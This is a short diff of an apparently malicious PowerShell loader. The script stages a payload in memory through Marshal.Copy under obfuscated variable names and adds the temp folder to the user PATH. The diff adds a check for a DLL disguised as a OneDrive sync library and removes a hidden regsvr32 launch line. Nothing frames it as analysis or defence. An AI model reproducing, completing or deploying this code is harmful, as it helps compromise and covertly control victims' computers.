@@ -11,6 +11,10 @@ sleep 10
 [System.Runtime.InteropServices.Marshal]::Copy($Ike3023rijweohfuoah29fhauiwoefawef, 0, $qQQ3023jiowfoweifjiowefwefwe, $zRij32r2)
 sleep 5
 
+$googoogaagaa = "$env:tmp\onedrivefilesync.dll"
+if (-Not (Test-Path $googoogaagaa)) {
+
+
 $currentPath = [System.Environment]::GetEnvironmentVariable("PATH", "User")
 $newPath = $currentPath + ";$env:tmp"
 [System.Environment]::SetEnvironmentVariable("PATH", $newPath, "User")
@@ -55,4 +59,4 @@ try {
     Write-Output "Failed to send message. Error: $_"
 }
 
-#start powershell -windowstyle h -args 'sleep 10;REGSVR32 /s $env:tmp\OneDriveFileSync.dll'
+}
